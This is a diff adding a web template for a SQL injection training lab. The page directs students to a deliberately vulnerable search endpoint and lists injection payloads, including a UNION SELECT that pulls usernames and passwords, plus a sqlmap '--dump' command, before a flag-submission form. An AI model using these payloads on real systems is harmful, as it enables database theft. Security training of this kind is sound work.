@@ -1,0 +1,58 @@
+{% extends 'base.html' %}
+
+{% block title %}SQL Injection Lab{% endblock %}
+
+{% block content %}
+<div class="lab-container">
+    <h2>SQL Injection Lab</h2>
+    <p class="description">A product search endpoint on this server is vulnerable to SQL injection. Use sqlmap to exploit it.</p>
+
+    <div style="margin-top: 2rem; padding: 2rem; border: 1px solid var(--border-color); background-color: rgba(22, 27, 34, 0.5);">
+        <h3>&#9881; Lab Environment</h3>
+        <p style="margin-top: 1rem; color: #8b949e;">Vulnerable Endpoint:</p>
+        <pre class="command-output" style="margin: 0.5rem 0; display: block; border-left: 3px solid #3fb950; background: #000;"><a href="/search?id=1" style="color: #3fb950;" target="_blank">http://{{ target_host }}:5000/search?id=1</a></pre>
+        <p style="margin-top: 1rem; color: #8b949e;">This endpoint accepts an <code>id</code> parameter and returns product information from the database.</p>
+    </div>
+
+    <div class="instructions-section" style="margin-top: 2rem;">
+        <h3>Instructions</h3>
+
+        <p style="margin-top: 1rem;"><strong>Step 1:</strong> Try the endpoint manually in your browser:</p>
+        <pre class="command-output" style="margin: 0.5rem 0; display: block; border-left: 3px solid #d29922; background: #000;">http://{{ target_host }}:5000/search?id=1
+http://{{ target_host }}:5000/search?id=1 OR 1=1
+http://{{ target_host }}:5000/search?id=1 UNION SELECT 1,2,3</pre>
+
+        <p style="margin-top: 1.5rem;"><strong>Step 2:</strong> Run sqlmap to automate exploitation:</p>
+        <pre class="command-output" style="margin: 0.5rem 0; display: block; border-left: 3px solid #3fb950; background: #000;">sqlmap -u "http://{{ target_host }}:5000/search?id=1" --dump</pre>
+
+        <p style="margin-top: 1.5rem;"><strong>Step 3:</strong> Examine the dumped data for the flag.</p>
+
+        <p style="margin-top: 1.5rem;"><strong>Step 4:</strong> Submit the flag below.</p>
+    </div>
+
+    <div style="margin-top: 2rem; padding: 1.5rem; border: 1px dashed #d29922; background-color: rgba(210, 153, 34, 0.05); border-radius: 4px;">
+        <p style="color: #d29922;"><strong>&#9888; Tip:</strong> You can also try manual injection payloads directly in the browser URL bar to understand the vulnerability before using sqlmap.</p>
+        <p style="margin-top: 0.5rem; color: #8b949e;">Try payloads like: <code>1'</code>, <code>1 OR 1=1</code>, <code>1 UNION SELECT username,password,flag FROM users</code></p>
+    </div>
+
+    <div style="margin-top: 2rem; padding: 1.5rem; border: 1px dashed #d29922; background-color: rgba(210, 153, 34, 0.05); border-radius: 4px;">
+        <p style="color: #d29922;"><strong>&#9888; Note:</strong> You must have <a href="https://sqlmap.org/" style="color: #58a6ff;" target="_blank">sqlmap</a> installed on your system to complete this lab.</p>
+        <p style="margin-top: 0.5rem; color: #8b949e;">On Kali Linux it is pre-installed. Otherwise: <code>pip install sqlmap</code> or clone from GitHub.</p>
+    </div>
+
+    <!-- Flag Submission Form -->
+    <div class="submit-section" style="margin-top: 2rem; padding-top: 2rem; border-top: 1px dashed var(--border-color);">
+        <h3>Submit Flag</h3>
+        <form action="{{ url_for('submit_sqlmap') }}" method="POST" class="lab-form">
+            <input type="text" name="flag" placeholder="Enter flag here" class="input-field" required>
+            <button type="submit" class="btn btn-secondary">Submit</button>
+        </form>
+        
+        {% if flag_result %}
+        <div class="result-message {% if 'Correct' in flag_result %}success{% else %}error{% endif %}">
+            <strong>{{ flag_result }}</strong>
+        </div>
+        {% endif %}
+    </div>
+</div>
+{% endblock %}
